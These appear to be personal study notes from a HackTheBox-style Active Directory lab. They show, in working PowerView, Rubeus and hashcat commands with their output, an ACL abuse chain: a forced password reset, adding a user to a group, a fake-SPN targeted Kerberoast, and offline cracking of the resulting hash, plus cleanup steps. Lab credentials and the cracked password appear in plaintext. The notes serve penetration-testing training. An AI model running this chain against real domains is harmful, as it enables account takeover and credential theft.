# ACL Abuse Tactics

## Abusing ACLs

Prerequistes :
0. We get wley NTLM/v2 Hash using Responder. We crack wley hash offline and obtain his password. We enumerate the ACLs and see an attack chain to to take control of adunn who can perform DCSync Attack

Steps to perform :
1. Use the wley user to change the password for the damundsen user
2. Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user


1. Change Password

Creating a PSCredential Object
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

Creating a SecureString Object
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Changing the User's Password
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset

2. Add damundsen to the Help Desk Level 1 group

Creating a SecureString Object using damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

Adding damundsen to the Help Desk Level 1 Group
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'

Confirming damundsen was Added to the Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne

3. Take control of the adunn user

-> during this assesement, the customer did not allow us to change adunn password because he is an admin account

So we will perform Kerberoasting attack against his account to crack password offline

Creating a Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'

Kerberoasting with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap /outfile:type.hash
[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))
echo JG | base64 -d > type.hash
hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt 

## Cleanup

1. Remove the fake SPN we created on the adunn user.
2. Remove the damundsen user from the Help Desk Level 1 group
3. Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

--> This order is important

Removing the Fake SPN from adunn's Account
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'

Removing damundsen from the Help Desk Level 1 Group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'

Confirming damundsen was Removed from the Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

## LAB

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET
xfreerdp /u:wley /p:"transporter@4" /v:$TARGET

cd c:\tools
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset

$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed
whounces1950
tatem1940
whighwand1962
freg1943
sulliss
theken1998
vered1980
plase1985
trisheye
susecum
lifee1989
whyall
hinct1998
lacce1947
reaked
cousitony
anniguiturve
pristor
withem
sureat
nower1959
hilowentoce
hispossiond
damundsen
dpayne

Creating a Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'

.\Rubeus.exe kerberoast /user:adunn /nowrap /outfile:type.hash

type .\type.hash
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$B5C694B5C6E6533018353ABF3B96619E$BC9EB9D6E2FBF65CCFDBE77FCB8FA17F

[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))

On Pwn Box :

echo JGtyYjV0Z3MkMjMkKmFkdW5uJElOTEFORUZSRUlHSFQuTE9DQUwkbm90YWhhY2tlci9MRUdJVEBJTkxBTkVGUkVJR0hULkxPQ0FMKiRCNUM2OTRCNUM2RTY1MzMwMTgzNTNBQkYzQjk2NjE5RSRCQzlFQjlENkUyRkJGNjVDQ0ZEQkU3N0ZDQjhGQTE3RjU2NEEzOENCMDNDQ0YzMzlCM0U2MDYwQUY3MTlFRERBMEJFRkZFN0REREYyNDJFQUY5ODc5MTNCODEyNThBMTRFOUYyNEUzRUIzMUQ2MURCQ0Q4MDY2QzE3QjU0NDQ4NjBDNDgyQTkyQzNFNTBERTNFMDI4OEU5MTY3NEM5OUVCNDcxREUyQjFBODc5N0RCOUJGRjE5NTZBNUY0QTNBQTVERTAzNEYwMjQwNTk0MzUzQTdBQ0IwRURFQzM1RjkyRDYxQUU4NDY2MzY1RDA2RDFGQUI4NEVFMTI5NjVDRkUyNjZDQUNFRDc0MDRFMTNCMjQ3RDVDMjc2QTMzMjQxODU2RDU2RUU3MTBCQTNEQjZDQ0MwQkMyQTM2NDY2RTFDRTBEOTdCNTdCMjU1MDQyMDNFNzMwNzFBMjk5MjI2RDhGMEQ0N0ExQUYyODBGNkQ4RjFEODdDMUE1Q0E2QjU1MzFGMkNEOTUzQkE5RTRDQjA1NjI1QTY1QjU1RTVGNzZERkJDRDQ5Rjc4NTY2NDJDMzcwMDhDMDlCNkZDNkJDNzgyQjIxNDc1NTVFNDFCMzZGODIwMDE0QUQzOEIxNTA2MEU5NDcwQzUyNEQwOEI2NjJFQjY2MEYxMDZBMDM5RkMxM0ZBRDk4RUYyQ0FFOTRDQzUyNjU4OEVBOUJGN0Y2NTlFRDEzNEU5NzZEODFFM0YwNzA5MDA0QUUyM0ZBM0Q3NTNCOTc0RkYxNEQxMjJFRkNBNkQ2Q0VCRTQxRkQ5QTU5RDY2REIzRUZDMTYwMkExNTRDOEUzMUE5Mjg3REE3MzU5REIyRDhEOTdERDg4NTgzMEMyMUFFNzI5NDNEMDE0RjhCN0EyMEVEQTRDOTU5MkY0N0UwODIzMTA1NzE1NjUwRUFFMUNBNzNFNzM2MzYwN0YwNkRDMENCMzRERjIyQzYxODUwMzRFQUQ3RjBCNjg4QjJBNkRFNjE2OEI0MDY3RUFENjYzNDNBMDZBQjA1NEQ1NUZEOENDOTA3ODVFNjAxQzE3REIzQTE4QzVEMjVFQTRCM0FDRTMzMTg1MTgwRURFQkY2RUNDQzRDRkU3QUI5QjE4N0JCNzY3MDFCQUI5RjFGNzU4RDFFNkVEMUE0MDY0OUU5QjYyQTBEQUZFNTkxREE4MThCOEEyMUJGMTc4Qjg4Njk0QTNCOUJFRjQxRDM5NDkwRTUwMDE5Q0Q4OUU2NDI2MkVCMzcyNDA5M0QxN0Q4MDlDMUExQjFCOTVGQkNDNjQ1Q0NEMjczM0FFQzQxNTA1NTEyQTkwMEUyRjBGRjE1N0JCMjFBRDc5MjM1RUQ2QUMxRDA1MUVBMEFCM0NGNTNGNzUxOEU3OTQzNDg5MEJCMDlGMUQxODNBRUZCQjQxNjhDREE5NjZGMTQ5M0Y3ODBFRkEzRTI4MTA3MEJCRURBQzI3N0I2Njc4MjhENDFFRTgwMkY5MjVCNkNGN0E3Mjc2MUI1RTY3OTc4OTQ0NzFGNUJGMDA5NkU3NzYzREQzN0YzQzFEMTc5MzZENjlCQkE4RTM3MzhBOEIyODJDMkQ4QjEwNTBCNzkwQjFGRDNDMkRCNjUxMjQ4Mjc1RDQyNEVEMzI0RTQwOEQ2MDczQzFBNDRFMDAwRjNGMDFBNDAzOUJDRjg0RTRGOUI4MzJBRjc3MENDMTBDNjQ4QUNBRjE0NDAzODJDRkFBQjNGRjEzNDM2M0JCOTBBNzMzRDk3REMwRUQ2NTA4QjI2NjM4NUE0RjFDNEFBN0Q0OEI2RTA1MkYwRjZBMDFENUY3MDJENkM1MTFBNDRGNjIwN0MxQzUwODAzQUVGQjFEQkQ1ODlCRkIyMzNBNDBFRTkwN0M2M0M1MjU3M0JCNDk5MjYyODMzMjczNkM3RUZFNkMwMTFCNjI2NjhCQzdCRkZFNEYzMjgyOUUwOTAyMjUwNjU0MzQ5MUJBNUE1NzFGMDlDMjhDRTY3OTcyQjFBQzRBNzM0QUU1RkUyRDY5OEY0QUQ4NjIwNzYwRUY4MTc4OTcyODcwMkI3NThBMzQ1NURFOUIzQTdGNDQzMzczMzRCMEM0QjQwQzBFQTc4MzI5OTU3RDc3Q0VFNDJCN0ZGQTk4MjgzODZDODg2RUM5QkU1N0Q5NkE2NkQ2MTYxMjQyMUI3Q0E2OTNERTY5N0JBNjlBN0EyQ0MzMTA3N0Q4Rjc1Qzc1MjI4RDAzMUEyMTBEQTg1N0VGNkFDNjQ5QTUyRTJBOUUzMjU0REZCOUU0MkUxOTBFRDVGQTBDODkzMUI1Q0Y1NEM5OTg4RkRFOUYzM0ZEOEE3MzkxQ0U4OTMzQjVCRjVBRDM4NkYzMTFFN0MwMkZBNzhBQzNCOEU0MUM5OEE2MDdFMzNDQkIzRDkwRkE1RUJCMkIxRjU2QTZGRDJFMzNGRjI2MDAzNzc1MDQwNjI3MjhEMThBOTQ2NTZFMjU0NTBDODE2QTIwQUVCRjI4QkM0NjAxQjdGOUM5NDM2QzU4QTBDMjdFMTVDNTVFN0RGQkI3NjFDMDM5RjU5RDU4RDBCOUVGODBCOEQ4NTg5QTIxRjI1NkJGRERFN0E2NUUyMTdGMzc3REE0NEMxRTAyQjdCQzREOUY3OUZCRjAyMTA4MUZGQUQxRTJFNUI1MDFFN0QxNjY1QTA4QTNGRkU1NDdGNEJDRTVFMzZDMDkwMEVFQTE2NTM5NjAxMTBFNzREODY4MURBMDQ0MUI2QTMyQTRCMjc5MkUyM0Y3OEJDM0JCRTYwMTAxQUQ3ODdFMkYwNzBDRTk0NDlGMkQzNEIzNTM4QkIxMEY5RkVGODgyNDMwMjE2NzVDRTZFRTk1NUI5N0NEQzM0RjgzMDJDMzA3REQ0N0ZCQTJBNDRCM0IxRENFMjNCMThCQkE5RUE0QjhENzIyRUM1MjUyMzE5MTc2MjVGMEY5NzE1RjM4REE4MDdBRjVBODMxREQ4RTBGQTRCREU0MEUxNENDRjBFNjY1ODcxNkE4MjYxN0VDMzdFNkMyNERCOENCODEyQkQ5QTI5OUExQkEyMkQ1QkYzMTI4RkI5Q0IwNkJDOUIyRTExNDhEMDA3Rjg0MUYxMDk3MUIyN0FFRTgzRQ0K | base64 -d > type.hash

tail -f type.hash 
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$B5C694B5C6E65330

hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt 

SyncMaster757